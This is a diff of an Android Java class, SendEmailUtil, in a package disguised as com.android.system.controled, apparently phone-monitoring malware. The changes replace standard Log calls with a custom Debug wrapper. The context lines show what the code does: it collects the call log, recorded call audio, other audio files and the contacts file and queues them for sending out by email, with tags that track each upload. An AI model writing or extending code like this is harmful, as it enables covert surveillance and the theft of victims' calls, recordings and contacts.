@@ -23,8 +23,8 @@ import javax.mail.internet.MimeMultipart;
 import javax.mail.internet.MimeUtility;
 
 import android.content.Context;
-import android.util.Log;
 
+import com.android.system.controled.Debug;
 import com.android.system.controled.Globle;
 import com.android.system.controled.db.DatabaseUtil;
 
@@ -81,11 +81,11 @@ public class SendEmailUtil {
 					Vector<String> files = new Vector<String>();
 
 					if (Globle.FILE_CALL_LOG.exists()) {
-						Log.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
+						Debug.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
 						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
 					}
 					if ((new File(FILE_CALL)).exists()) {
-						Log.v("Add", FILE_CALL);
+						Debug.v("Add", FILE_CALL);
 						files.add(FILE_CALL);
 					}
 
@@ -139,7 +139,7 @@ public class SendEmailUtil {
 						if (audios != null) {
 							for (File audio : audios) {
 								files.add(audio.getAbsolutePath());
-								Log.e("Add", " add file = " + audio.getAbsolutePath());
+								Debug.e("Add", " add file = " + audio.getAbsolutePath());
 							}
 						}
 					}
@@ -193,7 +193,7 @@ public class SendEmailUtil {
 						if (audios != null) {
 							for (File audio : audios) {
 								files.add(audio.getAbsolutePath());
-								Log.e("Add", " add other audio file = " + audio.getAbsolutePath());
+								Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
 							}
 						}
 					}
@@ -243,11 +243,11 @@ public class SendEmailUtil {
 					Vector<String> files = new Vector<String>();
 
 					if (Globle.FILE_CALL_LOG.exists()) {
-						Log.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
+						Debug.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
 						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
 					}
 					if ((new File(FILE_CALL)).exists()) {
-						Log.v("Add", FILE_CALL);
+						Debug.v("Add", FILE_CALL);
 						files.add(FILE_CALL);
 					}
 
@@ -257,7 +257,7 @@ public class SendEmailUtil {
 						if (audios != null) {
 							for (File audio : audios) {
 								files.add(audio.getAbsolutePath());
-								Log.e("Add", " add call audio file = " + audio.getAbsolutePath());
+								Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
 							}
 						}
 					}
@@ -268,7 +268,7 @@ public class SendEmailUtil {
 						if (audios != null) {
 							for (File audio : audios) {
 								files.add(audio.getAbsolutePath());
-								Log.e("Add", " add other audio file = " + audio.getAbsolutePath());
+								Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
 							}
 						}
 					}
@@ -318,13 +318,12 @@ public class SendEmailUtil {
 					Vector<String> files = new Vector<String>();
 
 					if (Globle.FILE_CONTACTS.exists()) {
-						Log.v("Add", Globle.FILE_CONTACTS.getAbsolutePath());
+						Debug.v("Add", Globle.FILE_CONTACTS.getAbsolutePath());
 						files.add(Globle.FILE_CONTACTS.getAbsolutePath());
 					}
 
 					if (files.size() <= 0) {
 						content = "联系人为空！";
-						;
 					}
 
 					try {
@@ -349,13 +348,13 @@ public class SendEmailUtil {
 
 	private void deleteTag(Context context, String code) {
 		if (Globle.FILE_TAG_UPLOAD_TAG.exists() && FileUtil.read(Globle.FILENAME_TAG_UPLOAD_TAG, context).equals(code)) {
-			Log.e(TAG, "  deleteTag   " + code);
+			Debug.e(TAG, "  deleteTag   " + code);
 			Globle.FILE_TAG_UPLOAD_TAG.delete();
 		}
 	}
 
 	private void addTag(Context context, String code) {
-		Log.e(TAG, "  addTag   " + code);
+		Debug.e(TAG, "  addTag   " + code);
 		FileUtil.write(code, Globle.FILENAME_TAG_UPLOAD_TAG, context);
 
 	}
